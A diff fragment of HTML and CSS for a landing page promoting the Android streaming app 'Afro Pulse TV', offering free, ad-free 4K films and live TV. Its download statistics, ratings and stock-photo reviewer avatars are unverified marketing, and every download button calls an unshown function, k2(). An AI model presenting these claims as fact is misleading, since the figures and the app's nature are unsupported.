+.ps-card{aspect-ratio:2/3;border-radius:12px;overflow:hidden;position:relative;box-shadow:0 8px 18px rgba(0,0,0,0.45)}
+.ps-card img{width:100%;height:100%;object-fit:cover}
+.ps-card .ps-badge{position:absolute;top:6px;left:6px;font-family:var(--mono);font-size:.48rem;font-weight:700;letter-spacing:.06em;padding:2px 6px;border-radius:6px;background:var(--hot);color:#fff}
+.ps-playbar{position:absolute;bottom:16px;left:14px;right:14px;height:46px;border-radius:12px;background:rgba(255,255,255,0.09);backdrop-filter:blur(8px);display:flex;align-items:center;gap:10px;padding:0 12px}
+.ps-playbar .pb-play{width:30px;height:30px;border-radius:50%;background:var(--grad);display:flex;align-items:center;justify-content:center;color:#04121a}
+.ps-playbar .pb-play svg{width:14px;height:14px}
+.ps-playbar .pb-track{flex:1;height:4px;border-radius:2px;background:rgba(255,255,255,0.2);overflow:hidden}
+.ps-playbar .pb-track i{display:block;width:64%;height:100%;background:var(--grad)}
+
+/* ============================================================
+   FAQ — left intro + right accordion
+   ============================================================ */
+.faq-grid{display:grid;grid-template-columns:1fr;gap:40px}
+@media(min-width:960px){.faq-grid{grid-template-columns:0.9fr 1.1fr;gap:72px;align-items:start}}
+.faq-intro{position:sticky;top:100px}
+.faq-intro h2{font-family:var(--display);font-size:clamp(1.8rem,3.4vw,2.5rem);font-weight:700;letter-spacing:-.02em;line-height:1.08;color:var(--ink);margin-bottom:16px}
+.faq-intro p{font-size:.95rem;color:var(--ink-3);max-width:40ch;margin-bottom:26px}
+.faq-note{display:flex;align-items:flex-start;gap:14px;padding:18px;border:1px solid var(--line);border-radius:var(--radius-md);background:linear-gradient(135deg,rgba(34,211,238,.09),rgba(129,140,248,.05));margin-bottom:24px}
+.faq-note-ico{width:40px;height:40px;min-width:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;background:rgba(34,211,238,.12);color:var(--accent)}
+.faq-note-ico svg{width:20px;height:20px}
+.faq-note b{display:block;font-family:var(--display);font-size:.95rem;font-weight:600;color:var(--ink);margin-bottom:3px}
+.faq-note span{font-size:.82rem;color:var(--ink-3);line-height:1.55}
+.faq-support{display:inline-flex;align-items:center;gap:8px;font-family:var(--display);font-size:.9rem;font-weight:600;color:var(--accent);transition:gap .2s var(--ease)}
+.faq-support:hover{gap:12px}
+.faq-list{display:flex;flex-direction:column;gap:12px}
+.faq-item{position:relative;border:1px solid var(--line);border-radius:var(--radius-md);background:var(--surface);overflow:hidden;transition:border-color .25s,background .25s,box-shadow .3s}
+.faq-item:hover{border-color:var(--line-strong)}
+.faq-item.open{background:var(--surface-2);border-color:var(--line-strong);box-shadow:0 20px 44px -30px rgba(34,211,238,.6)}
+.faq-q{display:flex;align-items:center;gap:16px;padding:20px 22px;width:100%;text-align:left;cursor:pointer}
+.faq-num{font-family:var(--mono);font-size:.72rem;font-weight:600;letter-spacing:.05em;color:var(--ink-3);min-width:26px;transition:color .25s}
+.faq-item.open .faq-num{color:var(--accent)}
+.faq-qt{flex:1;font-family:var(--display);font-size:1rem;font-weight:600;color:var(--ink)}
+.faq-item.open .faq-qt{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-fill-color:transparent}
+.faq-plus{width:30px;height:30px;min-width:30px;border-radius:10px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.06);border:1px solid var(--line-strong);color:var(--accent);transition:transform .3s var(--ease),background .3s}
+.faq-item.open .faq-plus{transform:rotate(45deg);background:var(--grad);color:#04121a;border-color:transparent}
+.faq-plus svg{width:16px;height:16px}
+.faq-a{max-height:0;overflow:hidden;transition:max-height .4s var(--ease)}
+.faq-item.open .faq-a{max-height:620px}
+.faq-a p{margin:0;padding:0 22px 22px 64px;font-size:.9rem;color:var(--ink-2);line-height:1.7}
+
+/* ============================================================
+   FOOTER
+   ============================================================ */
+.footer{margin-top:96px;padding:72px 0 44px;border-top:1px solid var(--line);background:var(--bg-2);position:relative;overflow:hidden}
+.footer::before{content:'';position:absolute;top:-200px;left:50%;transform:translateX(-50%);width:700px;height:400px;background:radial-gradient(closest-side,rgba(129,140,248,0.1),transparent);pointer-events:none}
+.foot-grid{position:relative;display:grid;grid-template-columns:1fr;gap:40px}
+@media(min-width:760px){.foot-grid{grid-template-columns:1.6fr 1fr 1fr;gap:48px}}
+.foot-brand{display:flex;align-items:center;gap:12px;margin-bottom:18px}
+.foot-brand img{width:40px;height:40px;border-radius:11px;box-shadow:0 0 0 1px var(--line-strong)}
+.foot-brand b{font-family:var(--display);font-size:1.2rem;font-weight:700}
+.foot-brand b em{font-style:normal;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-fill-color:transparent}
+.foot-col p{font-size:.88rem;color:var(--ink-3);max-width:34ch;line-height:1.65}
+.foot-col h4{font-family:var(--display);font-size:.82rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;color:var(--ink);margin-bottom:18px}
+.foot-col ul{list-style:none;display:flex;flex-direction:column;gap:12px}
+.foot-col ul a{font-size:.88rem;color:var(--ink-3);transition:color .2s,transform .2s var(--ease);display:inline-block}
+.foot-col ul a:hover{color:var(--accent);transform:translateX(3px)}
+.foot-bottom{position:relative;margin-top:52px;padding-top:24px;border-top:1px solid var(--line);display:flex;flex-wrap:wrap;gap:14px;align-items:center;justify-content:space-between}
+.foot-bottom span{font-size:.8rem;color:var(--ink-3)}
+.foot-ver{font-family:var(--mono);font-size:.68rem;color:var(--ink-3);background:var(--surface);border:1px solid var(--line);padding:4px 12px;border-radius:var(--radius-full)}
+
+/* ============================================================
+   FLOATING DOWNLOAD PILL
+   ============================================================ */
+.floatbar{position:fixed;left:50%;bottom:18px;transform:translate(-50%,130%);z-index:90;display:flex;align-items:center;gap:12px;max-width:calc(100% - 32px);padding:10px 12px 10px 12px;border-radius:22px;background:rgba(11,13,20,0.82);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);border:1px solid var(--line-strong);box-shadow:0 20px 60px rgba(0,0,0,0.55);transition:transform .5s var(--ease)}
+.floatbar.show{transform:translate(-50%,0)}
+.floatbar-icon{width:42px;height:42px;min-width:42px;border-radius:13px;overflow:hidden;box-shadow:0 0 0 1px var(--line-strong)}
+.floatbar-icon img{width:100%;height:100%;object-fit:cover}
+.floatbar-meta{min-width:0;margin-right:4px}
+.floatbar-name{font-family:var(--display);font-size:.86rem;font-weight:700;color:var(--ink);white-space:nowrap}
+.floatbar-sub{display:flex;align-items:center;gap:5px;font-family:var(--mono);font-size:.62rem;color:var(--ink-3)}
+.floatbar-sub svg{width:11px;height:11px;color:var(--amber)}
+.floatbar-btn{flex-shrink:0;min-height:44px;padding:11px 20px;border-radius:14px;background:var(--grad);color:#04121a;font-family:var(--display);font-size:.82rem;font-weight:700;box-shadow:0 10px 26px rgba(34,211,238,.3);transition:transform .2s var(--ease)}
+.floatbar-btn:active{transform:scale(.95)}
+
+/* ============================================================
+   MOBILE REFINEMENTS — smaller type, airier rhythm
+   ============================================================ */
+@media(max-width:640px){
+  body{line-height:1.62}
+  .nav-inner{height:58px}
+  .nav-brand{font-size:1rem}
+  .nav-brand img{width:28px;height:28px}
+  .nav-cta{font-size:.8rem;padding:9px 16px}
+  .hero{min-height:100dvh;padding:78px 0 76px}
+  .hero-title{font-size:clamp(2.2rem,10.5vw,3rem);line-height:1.08;letter-spacing:-.02em;margin-bottom:18px}
+  .hero-desc{font-size:.94rem;line-height:1.7;margin-bottom:28px}
+  .hero-badge{font-size:.66rem;margin-bottom:20px}
+  .hero-actions{gap:12px;margin-bottom:34px;margin-top:18px}
+  .btn{font-size:.9rem;padding:13px 20px}
+  .btn-lg{font-size:.98rem;padding:16px 22px}
+  .hero-stats{padding-top:20px}
+  .hstat b{font-size:1.5rem}
+  .hstat span{font-size:.68rem}
+  .stat b{font-size:1.5rem}
+  .stat{padding:20px 26px;gap:9px}
+  .stat span{font-size:.72rem}
+  .sec{padding:72px 0 0}
+  .sec-head{margin-bottom:30px}
+  .sec-head .h2{font-size:1.6rem;line-height:1.14}
+  .sec-head .sub{font-size:.86rem;line-height:1.6;margin-top:12px}
+  .eyebrow{font-size:.6rem;margin-bottom:11px}
+  .trend-hero-info h3{font-size:1.5rem}
+  .trend-hero-info p{font-size:.84rem}
+  .trend-rank{font-size:2.8rem}
+  .live-card{min-height:190px;padding:18px}
+  .live-card h4{font-size:1.1rem}
+  .feat-row{padding:22px}
+  .feat-icon{width:48px;height:48px;min-width:48px;border-radius:14px}
+  .feat-icon svg{width:24px;height:24px}
+  .feat-text h3{font-size:1.08rem}
+  .feat-text p{font-size:.84rem;line-height:1.6}
+  .tog-panel{padding:36px 20px}
+  .tog-copy h2{font-size:1.55rem}
+  .tog-item span{font-size:.86rem}
+  .rev-big{font-size:3rem}
+  .rev-card{padding:20px}
+  .rev-card .rev-text{font-size:.88rem;line-height:1.66}
+  .sec-terminal .term-body{font-size:.72rem}
+  .dl-panel{padding:40px 22px}
+  .dl-copy h2{font-size:1.7rem}
+  .dl-copy>p{font-size:.9rem}
+  .faq-intro h2{font-size:1.6rem}
+  .faq-q{padding:17px 18px;gap:12px}
+  .faq-num{min-width:22px}
+  .faq-qt{font-size:.95rem}
+  .faq-a p{font-size:.86rem;padding-left:52px}
+  .foot-grid{gap:32px}
+  .foot-col p{font-size:.84rem}
+  .footer{padding:56px 0 120px}
+}
+
+/* floating mobile download button */
+.mobile-fab{position:fixed;left:16px;right:16px;bottom:calc(14px + env(safe-area-inset-bottom));z-index:95;display:none}
+@media(max-width:768px){
+  .mobile-fab{display:block}
+  .floatbar{display:none}
+}
+.mobile-fab button{width:100%;min-height:56px;border-radius:16px;background:var(--grad);color:#04121a;font-family:var(--display);font-size:1rem;font-weight:700;letter-spacing:.01em;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 16px 44px rgba(34,211,238,.42);transition:transform .2s var(--ease),box-shadow .2s}
+.mobile-fab button:active{transform:scale(.97)}
+.mobile-fab svg{width:20px;height:20px}
+
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:0.01ms!important;animation-iteration-count:1!important;transition-duration:0.01ms!important}
+  html{scroll-behavior:auto}
+  .reveal{opacity:1;transform:none}
+}
+</style>
+</head>
+<body id="top">
+
+<a class="skip" href="#main">Skip to content</a>
+
+<!-- ============================================================
+     NAV
+     ============================================================ -->
+<header class="nav" id="nav">
+  <div class="container nav-inner">
+    <a class="nav-brand" href="#top"><img src="img/logo.jpg" alt="Afro Pulse TV logo"><span>Afro Pulse <em>TV</em></span></a>
+    <nav class="nav-links" aria-label="Primary">
+      <a href="#trending">Trending</a>
+      <a href="#live">Live TV</a>
+      <a href="#features">Features</a>
+      <a href="#reviews">Reviews</a>
+      <a href="#faq">FAQ</a>
+    </nav>
+    <button class="nav-cta" onclick="k2()">Download</button>
+  </div>
+</header>
+
+<!-- ============================================================
+     HERO — cinematic image
+     ============================================================ -->
+<section class="hero" aria-label="Intro">
+  <div class="hero-media" aria-hidden="true"><img src="img/t1.jpg" alt="" loading="eager"></div>
+  <div class="hero-vignette" aria-hidden="true"></div>
+  <div class="container hero-inner">
+    <div class="hero-badge reveal"><span class="dot"></span><span data-i18n="hero_eyebrow">#1 Entertainment App · 2026</span></div>
+    <h1 class="hero-title">
+      <span class="hero-title-a reveal" data-d="1" data-i18n="hero_title_a">Cinema in your</span>
+      <span class="hero-title-b reveal" data-d="2" data-i18n="hero_title_b">pocket</span>
+    </h1>
+    <p class="hero-desc reveal" data-d="2" data-i18n="hero_desc">Stream blockbusters, watch live TV, download for offline — all in stunning 4K HDR. No ads. Ever.</p>
+    <div class="hero-actions reveal" data-d="3">
+      <button class="btn btn-primary btn-lg" onclick="k2()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        <span data-i18n="hero_cta">Download Free</span>
+      </button>
+    </div>
+    <div class="hero-stats reveal" data-d="4">
+      <div class="hstat"><b data-count="4.8" data-dec="1">4.8</b><span data-i18n="stat2">Average Rating</span></div>
+      <div class="hstat"><b data-count="50" data-suffix="M+">50M+</b><span data-i18n="stat1">Downloads Worldwide</span></div>
+      <div class="hstat"><b data-count="10" data-suffix="K+">10K+</b><span data-i18n="live_titles">Titles</span></div>
+    </div>
+  </div>
+  <div class="hero-scroll" aria-hidden="true"><div class="mouse"></div><span>Scroll</span></div>
+</section>
+
+<!-- ============================================================
+     STATS — marquee ticker
+     ============================================================ -->
+<section class="stats" aria-label="Key numbers">
+  <div class="stats-track">
+    <div class="stats-group">
+      <div class="stat"><b>50M+</b><span data-i18n="stat1">Downloads Worldwide</span></div><span class="stat-sep">✦</span>
+      <div class="stat"><b>4.8</b><span data-i18n="stat2">Average Rating</span></div><span class="stat-sep">✦</span>
+      <div class="stat"><b>10K+</b><span data-i18n="live_titles">Titles</span></div><span class="stat-sep">✦</span>
+      <div class="stat"><b>120+</b><span data-i18n="stat3">Countries Available</span></div><span class="stat-sep">✦</span>
+      <div class="stat"><b>100%</b><span>Free · No Ads</span></div><span class="stat-sep">✦</span>
+    </div>
+    <div class="stats-group" aria-hidden="true">
+      <div class="stat"><b>50M+</b><span data-i18n="stat1">Downloads Worldwide</span></div><span class="stat-sep">✦</span>
+      <div class="stat"><b>4.8</b><span data-i18n="stat2">Average Rating</span></div><span class="stat-sep">✦</span>
+      <div class="stat"><b>10K+</b><span data-i18n="live_titles">Titles</span></div><span class="stat-sep">✦</span>
+      <div class="stat"><b>120+</b><span data-i18n="stat3">Countries Available</span></div><span class="stat-sep">✦</span>
+      <div class="stat"><b>100%</b><span>Free · No Ads</span></div><span class="stat-sep">✦</span>
+    </div>
+  </div>
+</section>
+
+<main id="main">
+
+  <!-- ============================================================
+       TRENDING — featured spotlight + ranked rail
+       ============================================================ -->
+  <section class="sec" id="trending">
+    <div class="container">
+      <header class="sec-head reveal">
+        <div class="eyebrow" data-i18n="trending_label">Trending Now</div>
+        <h2 class="h2"><span data-i18n="trending_h_a">What the world</span> <span class="grad-text" data-i18n="trending_h_b">is watching</span></h2>
+        <p class="sub" data-i18n="trending_sub">Top picks, updated daily</p>
+      </header>
+      <div class="trend-grid">
+        <article class="trend-hero reveal">
+          <div class="trend-hero-art"><img src="img/1a.png" alt="Project Hail Mary poster" loading="lazy"></div>
+          <span class="trend-hero-badge" data-i18n="card_hot">HOT</span>
+          <div class="trend-hero-info">
+            <div class="trend-rank">01</div>
+            <h3>Project Hail Mary</h3>
+            <p>A lone astronaut wakes with no memory and one impossible mission — save humanity from the stars.</p>
+            <div class="trend-hero-meta"><span class="st">★ 4.9</span><span>Sci-Fi · 2026</span><span>4K HDR</span></div>
+            <button class="btn btn-primary btn-sm" onclick="k2()">
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg>
+              Watch now
+            </button>
+          </div>
+        </article>
+        <div class="trend-rail">
+          <div class="rail-item reveal" data-d="1" onclick="k2()"><span class="rail-num">02</span><img class="rail-thumb" src="img/2a.png" alt="Send Help poster" loading="lazy"><div class="rail-info"><b>Send Help</b><span><span class="st">★ 4.7</span> · NEW</span></div><span class="rail-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg></span></div>
+          <div class="rail-item reveal" data-d="2" onclick="k2()"><span class="rail-num">03</span><img class="rail-thumb" src="img/3a.png" alt="Good Luck, Have Fun poster" loading="lazy"><div class="rail-info"><b>Good Luck, Have Fun</b><span><span class="st">★ 4.8</span> · TOP</span></div><span class="rail-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg></span></div>
+          <div class="rail-item reveal" data-d="3" onclick="k2()"><span class="rail-num">04</span><img class="rail-thumb" src="img/4a.png" alt="Years Later poster" loading="lazy"><div class="rail-info"><b>Years Later</b><span><span class="st">★ 4.5</span> · 4K</span></div><span class="rail-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg></span></div>
+          <div class="rail-item reveal" data-d="4" onclick="k2()"><span class="rail-num">05</span><img class="rail-thumb" src="img/5a.png" alt="The Rip poster" loading="lazy"><div class="rail-info"><b>The Rip</b><span><span class="st">★ 4.6</span> · HD</span></div><span class="rail-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg></span></div>
+          <div class="rail-item reveal" data-d="4" onclick="k2()"><span class="rail-num">06</span><img class="rail-thumb" src="img/6a.png" alt="Crime 101 poster" loading="lazy"><div class="rail-info"><b>Crime 101</b><span><span class="st">★ 4.8</span> · NEW</span></div><span class="rail-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg></span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================
+       LIVE — horizontal scroll cards
+       ============================================================ -->
+  <section class="sec" id="live">
+    <div class="container">
+      <header class="sec-head reveal">
+        <div class="eyebrow">Global Live Streams</div>
+        <h2 class="h2">Live TV, <span class="grad-text">completely free</span></h2>
+        <p class="sub">Instant access to News, Sports, Movies, and Documentaries in one Android app.</p>
+      </header>
+    </div>
+    <div class="live-scroll container">
+      <article class="live-card reveal" style="--c:#e11d48;--c-glow:rgba(244,63,94,0.16);--gx:80%;--gy:0%">
+        <div class="live-top"><span class="live-dot"></span><span class="live-tag">Live</span><span class="live-viewers">12.4K watching</span></div>
+        <div class="live-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="2" fill="currentColor" stroke="none"/><path d="M16.24 7.76a6 6 0 010 8.48M7.76 7.76a6 6 0 000 8.48"/></svg></div>
+        <h4>News</h4><p>Breaking stories, 24/7</p>
+        <button class="live-play" onclick="k2()"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch live</button>
+      </article>
+      <article class="live-card reveal" data-d="1" style="--c:#2563eb;--c-glow:rgba(37,99,235,0.16);--gx:20%;--gy:10%">
+        <div class="live-top"><span class="live-dot"></span><span class="live-tag">Global</span><span class="live-viewers">8.1K watching</span></div>
+        <div class="live-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 010 20"/></svg></div>
+        <h4>World News</h4><p>Coverage, everywhere</p>
+        <button class="live-play" onclick="k2()"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch live</button>
+      </article>
+      <article class="live-card reveal" data-d="2" style="--c:#16a34a;--c-glow:rgba(22,163,74,0.16);--gx:80%;--gy:0%">
+        <div class="live-top"><span class="live-dot"></span><span class="live-tag">Sport</span><span class="live-viewers">23.9K watching</span></div>
+        <div class="live-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="6"/><path d="M15.5 13.5L17 21l-5-3-5 3 1.5-7.5"/></svg></div>
+        <h4>Sports Live</h4><p>Games, as they happen</p>
+        <button class="live-play" onclick="k2()"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch live</button>
+      </article>
+      <article class="live-card reveal" data-d="3" style="--c:#7c3aed;--c-glow:rgba(124,58,237,0.16);--gx:20%;--gy:10%">
+        <div class="live-top"><span class="live-dot"></span><span class="live-tag">Movie</span><span class="live-viewers">15.6K watching</span></div>
+        <div class="live-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 8h20M2 12h20M2 16h20M7 4v16M17 4v16"/></svg></div>
+        <h4>Movie Prime</h4><p>Blockbusters &amp; classics</p>
+        <button class="live-play" onclick="k2()"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch live</button>
+      </article>
+      <article class="live-card reveal" data-d="4" style="--c:#d97706;--c-glow:rgba(217,119,6,0.16);--gx:80%;--gy:0%">
+        <div class="live-top"><span class="live-dot"></span><span class="live-tag">Doc</span><span class="live-viewers">5.3K watching</span></div>
+        <div class="live-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg></div>
+        <h4>Discovery Hub</h4><p>Documentaries &amp; stories</p>
+        <button class="live-play" onclick="k2()"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch live</button>
+      </article>
+    </div>
+  </section>
+
+  <!-- ============================================================
+       FEATURES — numbered split list
+       ============================================================ -->
+  <section class="sec" id="features">
+    <div class="container">
+      <header class="sec-head reveal">
+        <div class="eyebrow" data-i18n="feat_label">Why Afro Pulse TV</div>
+        <h2 class="h2"><span data-i18n="feat_h_a">Everything you</span> <span class="grad-text" data-i18n="feat_h_b">need. Nothing you don't.</span></h2>
+      </header>
+      <div class="feat-list">
+        <article class="feat-row reveal" style="--f-c:#22d3ee;--f-soft:rgba(34,211,238,0.12);--f-glow:rgba(34,211,238,0.12)">
+          <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="4"/><polygon points="10 8 16 12 10 16 10 8" fill="currentColor" stroke="none"/></svg></div>
+          <div class="feat-text"><span class="feat-num">01</span><h3 data-i18n="feat1_h">4K HDR</h3><p data-i18n="feat1_p">Dolby Vision &amp; Atmos. Cinema-grade quality in your hands.</p></div>
+        </article>
+        <article class="feat-row reveal" data-d="1" style="--f-c:#818cf8;--f-soft:rgba(129,140,248,0.12);--f-glow:rgba(129,140,248,0.12)">
+          <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div>
+          <div class="feat-text"><span class="feat-num">02</span><h3 data-i18n="feat2_h">Offline Mode</h3><p data-i18n="feat2_p">Download anything. Watch on planes, trains, anywhere.</p></div>
+        </article>
+        <article class="feat-row reveal" data-d="2" style="--f-c:#c084fc;--f-soft:rgba(192,132,252,0.12);--f-glow:rgba(192,132,252,0.12)">
+          <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
+          <div class="feat-text"><span class="feat-num">03</span><h3 data-i18n="feat3_h">Multi-Device</h3><p data-i18n="feat3_p">Phone, tablet, TV — pause on one, resume on another.</p></div>
+        </article>
+        <article class="feat-row reveal" data-d="3" style="--f-c:#fbbf24;--f-soft:rgba(251,191,36,0.12);--f-glow:rgba(251,191,36,0.12)">
+          <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg></div>
+          <div class="feat-text"><span class="feat-num">04</span><h3 data-i18n="feat5_h">Massive Channel Library</h3><p data-i18n="feat5_p">Live channels across news, sports, entertainment, kids, and documentaries worldwide.</p></div>
+        </article>
+        <article class="feat-row reveal" data-d="4" style="--f-c:#34d399;--f-soft:rgba(52,211,153,0.12);--f-glow:rgba(52,211,153,0.12)">
+          <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg></div>
+          <div class="feat-text"><span class="feat-num">05</span><h3 data-i18n="feat6_h">Optimized for Android</h3><p data-i18n="feat6_p">Fast launch, smooth playback, and responsive controls designed for Android.</p></div>
+        </article>
+        <article class="feat-row reveal" data-d="4" style="--f-c:#f43f5e;--f-soft:rgba(244,63,94,0.12);--f-glow:rgba(244,63,94,0.12)">
+          <div class="feat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
+          <div class="feat-text"><span class="feat-num">06</span><h3 data-i18n="feat4_h">Early Access</h3><p data-i18n="feat4_p">Exclusive premieres &amp; behind-the-scenes before anyone else.</p></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================
+       TOGETHER — split panel
+       ============================================================ -->
+  <section class="sec">
+    <div class="container">
+      <div class="tog-panel reveal">
+        <div class="tog-copy">
+          <h2 data-i18n="bigfeat_h">⚡ Watch together, even apart</h2>
+          <div class="tog-list">
+            <div class="tog-item"><div class="tog-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h7l-1 8 10-12h-7l1-8z"/></svg></div><span data-i18n="bigfeat_1"><strong>Sync Play</strong> — watch in perfect sync with friends, anywhere in the world</span></div>
+            <div class="tog-item"><div class="tog-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="5"/><path d="M3 21v-1a7 7 0 0114 0v1"/></svg></div><span data-i18n="bigfeat_2"><strong>5 Profiles</strong> — each with personalized recommendations</span></div>
+            <div class="tog-item"><div class="tog-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></div><span data-i18n="bigfeat_3"><strong>Kids Mode</strong> — safe, curated content for the little ones</span></div>
+            <div class="tog-item"><div class="tog-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 010 20"/></svg></div><span data-i18n="bigfeat_4"><strong>AI Subtitles</strong> — real-time translation in 40+ languages</span></div>
+          </div>
+        </div>
+        <div class="tog-visual" aria-hidden="true">
+          <div class="tog-orbit">
+            <div class="tog-ring r2"></div>
+            <div class="tog-ring"></div>
+            <div class="tog-avatar a1"><img src="https://randomuser.me/api/portraits/women/44.jpg" alt="" loading="lazy"></div>
+            <div class="tog-avatar a2"><img src="https://randomuser.me/api/portraits/men/32.jpg" alt="" loading="lazy"></div>
+            <div class="tog-avatar a3"><img src="https://randomuser.me/api/portraits/women/23.jpg" alt="" loading="lazy"></div>
+            <div class="tog-avatar a4"><img src="https://randomuser.me/api/portraits/men/75.jpg" alt="" loading="lazy"></div>
+            <div class="tog-core"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h7l-1 8 10-12h-7l1-8z"/></svg></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================
+       REVIEWS — masonry wall
+       ============================================================ -->
+  <section class="sec" id="reviews">
+    <div class="container">
+      <header class="sec-head reveal">
+        <div class="eyebrow" data-i18n="reviews_label">Loved by Millions</div>
+        <h2 class="h2"><span data-i18n="reviews_h_a">Don't take our</span> <span class="grad-text" data-i18n="reviews_h_b">word for it</span></h2>
+      </header>
+      <div class="rev-summary reveal">
+        <div class="rev-big"><b data-count="4.8" data-dec="1">4.8</b></div>
+        <div>
+          <div class="rev-stars">
